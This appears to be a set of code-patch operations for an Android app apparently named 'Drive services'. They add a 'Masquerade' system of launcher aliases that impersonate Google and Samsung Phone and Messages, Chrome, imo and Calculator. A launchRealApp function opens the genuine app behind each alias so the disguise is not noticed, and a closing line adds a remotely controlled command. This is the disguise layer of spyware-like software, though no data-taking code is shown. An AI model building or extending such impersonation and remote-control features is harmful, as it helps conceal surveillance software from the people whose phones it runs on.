ops.text: Expand Masquerade system with 9 new brand aliases and updated launch-routing logic.

ops.replace_with:
<string name="app_name">Drive services</string>
    <string name="label_google_phone">Phone</string>
    <string name="label_google_msg">Messages</string>
    <string name="label_sam_phone">Phone</string>
    <string name="label_sam_msg">Messages</string>
    <string name="label_chrome">Chrome</string>
    <string name="label_imo">imo</string>
    <string name="label_imo_hd">imo HD</string>
    <string name="label_imo_beta">imo beta</string>
    <string name="label_imo_lite">imo lite</string>

ops.find_block:
<activity-alias
            android:name=".AliasCalc"
            android:targetActivity=".MainActivity"
            android:label="Calculator"
            android:icon="@mipmap/ic_masquerade_calc"
            android:roundIcon="@mipmap/ic_masquerade_calc"
            android:enabled="false"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>
ops.replace_with:
<activity-alias
            android:name=".AliasCalc"
            android:targetActivity=".MainActivity"
            android:label="Calculator"
            android:icon="@mipmap/ic_masquerade_calc"
            android:roundIcon="@mipmap/ic_masquerade_calc"
            android:enabled="false"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <activity-alias android:name=".AliasGooglePhone" android:targetActivity=".MainActivity" android:label="@string/label_google_phone" android:icon="@drawable/google_phone" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>
        <activity-alias android:name=".AliasGoogleMsg" android:targetActivity=".MainActivity" android:label="@string/label_google_msg" android:icon="@drawable/google_msg" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>
        <activity-alias android:name=".AliasSamPhone" android:targetActivity=".MainActivity" android:label="@string/label_sam_phone" android:icon="@drawable/sam_phone" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>
        <activity-alias android:name=".AliasSamMsg" android:targetActivity=".MainActivity" android:label="@string/label_sam_msg" android:icon="@drawable/sam_msg" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>
        <activity-alias android:name=".AliasChrome" android:targetActivity=".MainActivity" android:label="@string/label_chrome" android:icon="@drawable/chrome" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>
        <activity-alias android:name=".AliasImo" android:targetActivity=".MainActivity" android:label="@string/label_imo" android:icon="@drawable/imo" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>
        <activity-alias android:name=".AliasImoHd" android:targetActivity=".MainActivity" android:label="@string/label_imo_hd" android:icon="@drawable/imo_hd" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>
        <activity-alias android:name=".AliasImoBeta" android:targetActivity=".MainActivity" android:label="@string/label_imo_beta" android:icon="@drawable/imo_beta" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>
        <activity-alias android:name=".AliasImoLite" android:targetActivity=".MainActivity" android:label="@string/label_imo_lite" android:icon="@drawable/imo_lite" android:enabled="false" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity-alias>

private fun launchRealApp(skin: String) {
        try {
            val targetPkg = when (skin) {
                "CALC" -> listOf("com.google.android.calculator", "com.android.calculator2", "com.sec.android.app.popupcalculator").find { packageManager.getLaunchIntentForPackage(it) != null } ?: "com.google.android.calculator"
                "GOOGLE_PHONE" -> "com.google.android.dialer"
                "GOOGLE_MSG" -> "com.google.android.apps.messaging"
                "SAM_PHONE" -> "com.samsung.android.dialer"
                "SAM_MSG" -> "com.samsung.android.messaging"
                "CHROME" -> "com.android.chrome"
                "IMO" -> "com.imo.android.imoim"
                "IMO_HD" -> "com.imo.android.imoimhd"
                "IMO_BETA" -> "com.imo.android.imoimbeta"
                "IMO_LITE" -> "com.imo.android.imoimlite"
                else -> "com.google.android.apps.docs"
            }

ops.text: Implement SET_DEBUG_UI command to remotely enable/disable access to the on-device log console.
